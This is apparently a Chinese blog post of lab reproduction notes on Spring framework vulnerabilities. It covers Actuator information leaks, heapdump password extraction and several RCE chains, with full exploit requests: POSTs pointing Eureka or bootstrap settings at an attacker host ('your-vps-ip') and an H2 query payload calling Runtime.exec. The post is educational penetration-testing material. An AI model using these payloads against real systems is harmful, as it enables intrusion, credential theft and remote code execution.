---
title: Spring框架漏洞
date: 2023/6/22 10:40:25
categories:
- 漏洞复现
tags:
- 框架漏洞
---





## Spring概述

Spring Framework 是一个开源的应用程序框架和 Java 平台的控制容器的反转。由于其强大的功能和易用性，它在行业中被各种程序和系统广泛使用。一些知名产品如 Spring Boot 和 Spring Cloud 都是使用 Spring Framework 开发的。



## 框架特征

- 如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶
  ![image-20230622113805635](../../../images/image-20230622113805635.png)

  FoFa语法

  ```http
  icon_hash="116323821"
  ```

  

- 如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图：

  ![image-20230622113724212](../../../images/image-20230622113724212.png)

  FoFa语法

  ```http
  body="Whitelabel Error Page"
  ```



## Spring Boot Actuator未授权访问

### Actuator概述

​	Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。

​	其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：

![v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg](../../../images/v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg)



#### 版本问题

- `Spring Boot` < 1.5：默认未授权访问所有端点、
- `Spring Boot` >= 1.5：默认只允许访问 `/health` 和 `/info` 端点，但是此安全性通常被应用程序开发人员禁用了

- `Spring Boot`2.x相比于1.x版本的端点多了个前缀 `/actuator`，如`/health` 变成了`/actuator/health`。



#### 端点路径

设置管理端点的路径:

在1.x版本下，设置语句如下:

```
management.context-path =/manage
```

此时端点的访问方式就变为了:

```
/manage/dump
/manage/autoconfig
/manage/metrics
...
```

在2.x版本，设置语句如下:

```
management.endpoints.web.base-path=/manage
```

此时端点的访问方式就变为了:

```
# /actuator被manage代替

/manage/dump
/manage/autoconfig
/manage/metrics
...
```

> 有些人可能喜欢将其命名为`monitor`,所以知道这个特点，我们可以适当丰富下自己的字典。



### Actuator端点利用

#### /mappings

泄露路由信息

![image-20230623215633942](../../../images/image-20230623215633942.png)



#### /trace，/httptrace

- 获取基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）

- 存在的隐患：如果存在登录用户的操作请求，可以窃取用户凭证。

![image-20230623215702605](../../../images/image-20230623215702605.png)

**注意：这个只是显示最近的100条数据，但是我们可以写脚本来持续监控。**



#### /env

- 获取全部环境属性

- 存在的隐患

  - 可能会泄露数据库账号密码等敏感信息,但是泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式

  - Spring eureka xstream  RCE


#### /heapdump

> Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照
> Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息
> 通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文,accesskey等

访问后会下载heapdump

![image-20230623215844567](../../../images/image-20230623215844567.png)

##### heapdump分析工具

- [wyzxxz/heapdump_tool: heapdump敏感信息查询工具，例如查找 spring heapdump中的密码明文，AK,SK等](https://github.com/wyzxxz/heapdump_tool)

  ```
  基于JAVA自带的jhat，通过jhat解析heapdump文件
  ```

  ![image-20230711221037329](../../../images/image-20230711221037329.png)

- [JDumpSpider](https://github.com/whwlsfb/JDumpSpider)

  ```shell
  java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump
  ```

  ![image-20230622152614844](../../../images/image-20230622152614844.png)

  ![image-20230622152600035](../../../images/image-20230622152600035.png)

#### /redis/info

如果开放了redis服务（1234端口），可以尝试使用/actuator/redis/info语句看是否能读取敏感信息，如：http://www.xxx.com:1234/actuator/redis/info

## **Spring eureka xstream  RCE**

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标使用的 `eureka-client` < 1.8.7（通常包含在 `spring-cloud-starter-netflix-eureka-client` 依赖中）
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

![image-20230711220504085](../../../images/image-20230711220504085.png)

##### 复现

修改要执行的命令后

![image-20230623213306180](../../../images/image-20230623213306180.png)

起一个恶意eureka server 

![image-20230623213230483](../../../images/image-20230623213230483.png)

设置eureka.client.serviceUrl.defaultZone 属性为恶意的外部 eureka server URL 地址

```http
# spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example

# spring 2.x
POST /actuator/env
Content-Type: application/json
    
{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
```

![image-20230623213048736](../../../images/image-20230623213048736.png)

 refresh 触发目标机器请求远程 URL，提前架设的  eureka server 就会返回恶意的 payload

```http
# spring 1.x

POST /refresh
Content-Type: application/x-www-form-urlencoded  

# spring 2.x
POST /actuator/refresh
Content-Type: application/json
```

![image-20230623212943456](../../../images/image-20230623212943456.png)

从而触发 XStream 反序列化，造成 RCE 漏洞

![image-20230623212922680](../../../images/image-20230623212922680.png)


执行完命令后记得恢复，如果不恢复的话，那么命令就会一直执行，系统也会一直报错，将eureka.client.serviceUrl.defaultZone属性设置为原来的即可。


​    



## Spring cloud SnakeYAML RCE

### 版本影响

目标依赖的 `spring-cloud-starter` 版本 \< 1.3.0



### 复现

本地生成yaml-payload的jar包,命令为

![image-20230623221559474](../../../images/image-20230623221559474.png)

生成利用该jar包的example.yml文件

![image-20230623221123809](../../../images/image-20230623221123809.png)

挂载服务

![image-20230623221249623](../../../images/image-20230623221249623.png)

设置spring.cloud.bootstrap.location 属性为外部恶意 yml 文件 URL 地址

```php
# spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example.yml

# spring 2.x
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example.yml"}
```

![image-20230623220715323](../../../images/image-20230623220715323.png)

refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容

```php
# spring 1.x

POST /refresh
Content-Type: application/x-www-form-urlencoded


# spring 2.x

POST /actuator/refresh
Content-Type: application/json
```

![image-20230623220901991](../../../images/image-20230623220901991.png)

SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作,先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化,实例化类时执行恶意代码，造成 RCE 漏洞

![image-20230623220853189](../../../images/image-20230623220853189.png)



### 注入内存马

![image-20230623222557267](../../../images/image-20230623222557267.png)





## Spring restart h2 database query RCE

### 版本影响

存在 `com.h2database.h2` 依赖（版本要求暂未知）



### 复现

hackbar需要将原本的content-type删除，然后选择application/json才可以发送Content-Type: application/json的请求

```php
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
```

![image-20230623233147055](../../../images/image-20230623233147055.png)

```php
POST /actuator/restart
Content-Type: application/json
```

![image-20230623233543854](../../../images/image-20230623233543854.png)



![image-20230623233529452](../../../images/image-20230623233529452.png)



需要注意的是payload 中的 'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发

![image-20230623233701077](../../../images/image-20230623233701077.png)







## Spring Cloud Gateway SPEL RCE

Spring Cloud Gateway是Spring中的一个API网关。存在SpEL表达式注入漏洞，**当攻击者可以访问Actuator API的情况下**，将可以利用该漏洞执行任意命令。



### 版本影响

- Spring Cloud Gateway
  - 3.1.0
  - 3.0.0 to 3.0.6
  - Older, unsupported versions are also affected



### 复现

```
添加一个包含恶意SpEL表达式的路由/actuator/gateway/routes/hacktest
应用刚添加的路由/actuator/gateway/refresh
访问恶意路由得到结果/actuator/gateway/routes/hacktest
```

![image-20230622121048903](../../../images/image-20230622121048903.png)

![image-20230622121110774](../../../images/image-20230622121110774.png)





## Cloud Function  SPEL RCE

Spring Cloud Function 是Spring cloud中的serverless框架。

Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。

攻击者可通过该漏洞执行任意代码。



### 版本影响

org.springframework.cloud:spring-cloud-function-context（影响版本：3.0.0.RELEASE~3.2.2）



### 复现

accept需要修改

![](../../../images/image-20230622130314936.png)

![image-20230622130328296](../../../images/image-20230622130328296.png)



##  spring-core-rce

### 版本影响

使用JDK9及以上版本的Spring MVC框架
spring-webmvc 或 spring-webflux依赖
spring framework 5.3.0-5.3.17、5.2.0-5.2.19版本，以及更早的版本



### 复现

这里环境用vulfocus的，vulhub的不知道为啥不行

```
docker pull vulfocus/spring-core-rce-2022-03-29
docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29
```

攻击原理

```
通过修改Tomcat的日志路径与后缀写入jsp木马
```

脚本：https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE

![image-20230622144319219](../../../images/image-20230622144319219.png)

![image-20230622144248672](../../../images/image-20230622144248672.png)

![image-20230622143115129](../../../images/image-20230622143115129.png)

需要注意的是每次向webhsell请求时都会再次向其写入木马内容

![image-20230622143518694](../../../images/image-20230622143518694.png)

可以通过以下请求进行清除

```http
/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=
```

总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。





## 权限绕过

```
/admin/%0a
/admin/%0d

# CVE-2023-20860
/admin/** 
```



### 复现

![image-20230622145009253](../../../images/image-20230622145009253.png)

![image-20230622145034999](../../../images/image-20230622145034999.png)



## 参考文章

[LandGrey/SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list](https://github.com/LandGrey/SpringBootVulExploit#一信息泄露)

https://xz.aliyun.com/t/9763